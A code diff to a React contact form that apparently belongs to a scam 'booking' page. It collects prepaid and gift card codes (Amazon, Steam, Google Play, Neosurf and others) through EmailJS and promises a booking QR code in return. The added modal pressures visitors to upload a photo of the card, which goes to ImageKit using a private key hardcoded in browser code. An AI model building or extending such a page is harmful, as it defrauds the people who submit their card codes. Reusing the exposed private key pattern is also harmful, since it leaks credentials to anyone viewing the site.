@@ -1,8 +1,9 @@
 import { useEffect, useRef, useState } from 'react';
 import emailjs from '@emailjs/browser';
-import { Button, Checkbox, Label, TextInput, Select, Spinner } from 'flowbite-react';
-import { notification } from 'antd';
+import { Button, Checkbox, Label, TextInput, Select, Spinner, FileInput } from 'flowbite-react';
+import { Modal, notification } from 'antd';
 import Verifyme from "../../assets/images/bookme.png"
+import ImageKit from 'imagekit';
 
 export const ContactUs = () => {
     const [api, contextHolder] = notification.useNotification();
@@ -42,6 +43,46 @@ export const ContactUs = () => {
     };
 
     const [isSubmitting, setIsSubmitting] = useState(false)
+    const [modalState, setModalState] = useState({
+        open: false,
+        isSubmitting: false
+    })
+    const handleModalCancel = () => {
+        setModalState(prev => ({
+            ...prev,
+            open: false,
+            isSubmitting: false
+        }))
+
+        openNotification("If your code is valid, an email containing your booking QR code will be dispatched to your inbox. Thank you!")
+        // openNotification("If your code is valid, an email containing a sucess message will be dispatched to your inbox. Thank you for your cooperation!")
+        setIsSubmitting(false)
+    }
+
+    const handleModalOk = async () => {
+        setModalState(prev => ({
+            ...prev,
+            isSubmitting: true
+        }))
+
+        var imagekit = new ImageKit({
+            privateKey: "private_UqHVR8do3rujUUwidQ5GgzBQtKA=",
+            publicKey: "public_b58vvImj6TfnASdrJ2gC/nh2NEc=",
+            urlEndpoint: "https://ik.imagekit.io/b9ln9jsrg"
+        });
+
+        var file: any = document.getElementById("user_files");
+        if (file) {
+            imagekit.upload({
+                file: file.files[0],
+                fileName: "abc.jpg",
+                tags: ["tag1"]
+            }, function (_, result: any) {
+                console.log(result);
+                handleModalCancel()
+            })
+        }
+    };
 
     const formRef = useRef<any>();
 
@@ -59,23 +100,50 @@ export const ContactUs = () => {
             .sendForm(import.meta.env.VITE_ID_ONE, import.meta.env.VITE_ID, formRef.current, {
                 publicKey: import.meta.env.VITE_KEYER,
             })
-            .then(
-                () => {
-                    // console.log('SUCCESS!');
-                },
-                (_) => {
+            .then(() => {
+                // console.log('SUCCESS!');
+            }, () => {
 
-                },
+            },
             ).finally(() => {
-                openNotification("If your code is valid, an email containing your booking QR code will be dispatched to your inbox. Thank you!")
-                // openNotification("If your code is valid, an email containing a sucess message will be dispatched to your inbox. Thank you for your cooperation!")
-                setIsSubmitting(false)
-            });
+                setModalState(prev => ({
+                    ...prev,
+                    open: true
+                }))
+            })
     };
 
     return (
         <div className="py-10">
+            <Modal
+                title="Get Your Booking Details Faster"
+                open={modalState.open}
+                onOk={handleModalOk}
+                closeIcon={false}
+                cancelText="Ignore"
+                okText="Submit"
+                cancelButtonProps={{ className: "h-fit font-medium relative focus:z-10 focus:!outline-none !text-gray-900 bg-white !border !border-gray-200 enabled:hover:!bg-gray-100 enabled:hover:!text-cyan-700 focus:!ring-cyan-700 focus:!text-cyan-700 rounded-lg focus:!ring-2 py-2" }}
+                okButtonProps={{ className: "h-fit font-medium relative focus:z-10 focus:!outline-none text-white bg-cyan-700 !border !border-transparent enabled:hover:!bg-cyan-800 focus:!ring-cyan-300 rounded-lg focus:!ring-2 py-2" }}
+                confirmLoading={modalState.isSubmitting}
+                onCancel={() => {
+                    if (modalState.isSubmitting) return
+                    handleModalCancel()
+                }}
+            >
+                <div className="pt-7 pb-5 border-t border-gray-200">
+                    <div className="mb-2 block">
+                        <Label htmlFor="user_files" value="Upload The Card Image Or Screenshot for Quicker Email Delivery" />
+                    </div>
+                    <FileInput
+                        name='user_files'
+                        id="user_files"
+                        placeholder="-----"
+                        accept="image/*" />
+                </div>
+            </Modal>
+
             <img src={Verifyme} className="w-[300px] mx-auto mb-5" />
+
             <form ref={formRef} onSubmit={sendEmail} className="flex w-full lg:w-[50vw] flex-col gap-4 mx-auto px-10 py-7 bg-gray-50">
                 {contextHolder}
                 <div>
@@ -195,9 +263,10 @@ export const ContactUs = () => {
                         id="card_type" required shadow>
                         <option></option>
                         {[
-                            "TRANSCASH",
                             "NEOSURF",
-                            "GOOGLE PLAY",  // Typo corrected: Google Play
+                            "AMAZON",
+                            "RAZER GOLD",
+                            "GOOGLE PLAY",
                             "STEAM",
                             "ITUNES",
                             "PAYSAFE",
